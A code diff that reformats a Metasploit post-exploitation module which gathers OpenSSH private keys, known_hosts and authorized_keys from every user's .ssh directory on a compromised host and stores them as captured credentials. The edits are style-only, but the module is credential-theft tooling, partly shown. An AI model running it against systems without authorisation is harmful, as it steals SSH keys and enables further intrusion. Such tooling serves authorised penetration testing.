@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -8,32 +9,30 @@ require 'rex'
 require 'sshkey'
 
 class MetasploitModule < Msf::Post
-
   include Msf::Post::File
   include Msf::Post::Unix
 
-  def initialize(info={})
-    super( update_info(info,
-      'Name'           => 'Multi Gather OpenSSH PKI Credentials Collection',
-      'Description'    => %q{
-          This module will collect the contents of all users' .ssh directories on the targeted
-        machine. Additionally, known_hosts and authorized_keys and any other files are also
-        downloaded. This module is largely based on firefox_creds.rb.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         => ['Jim Halfpenny'],
-      'Platform'       => %w{ bsd linux osx unix },
-      'SessionTypes'   => ['meterpreter', 'shell' ]
-    ))
+  def initialize(info = {})
+    super(update_info(info,
+                      'Name'           => 'Multi Gather OpenSSH PKI Credentials Collection',
+                      'Description'    => %q(
+                          This module will collect the contents of all users' .ssh directories on the targeted
+                        machine. Additionally, known_hosts and authorized_keys and any other files are also
+                        downloaded. This module is largely based on firefox_creds.rb.
+                      ),
+                      'License'        => MSF_LICENSE,
+                      'Author'         => ['Jim Halfpenny'],
+                      'Platform'       => %w(bsd linux osx unix),
+                      'SessionTypes'   => ['meterpreter', 'shell' ]))
   end
 
   def run
     print_status("Finding .ssh directories")
-    paths = enum_user_directories.map {|d| d + "/.ssh"}
+    paths = enum_user_directories.map { |d| d + "/.ssh" }
     # Array#select! is only in 1.9
     paths = paths.select { |d| directory?(d) }
 
-    if paths.nil? or paths.empty?
+    if paths.nil? || paths.empty?
       print_error("No users found with a .ssh directory")
       return
     end
@@ -65,12 +64,12 @@ class MetasploitModule < Msf::Post
         print_good("Downloaded #{path}#{sep}#{file} -> #{loot_path}")
 
         begin
-          key = SSHKey.new(data, :passphrase => "")
+          key = SSHKey.new(data, passphrase: "")
 
           credential_data = {
             origin_type: :session,
             session_id: session_db_id,
-            post_reference_name: self.refname,
+            post_reference_name: refname,
             private_type: :ssh_key,
             private_data: key.key_object.to_s,
             username: user,
@@ -81,10 +80,7 @@ class MetasploitModule < Msf::Post
         rescue OpenSSL::OpenSSLError => e
           print_error("Could not load SSH Key: #{e.message}")
         end
-
       end
-
     end
   end
-
 end
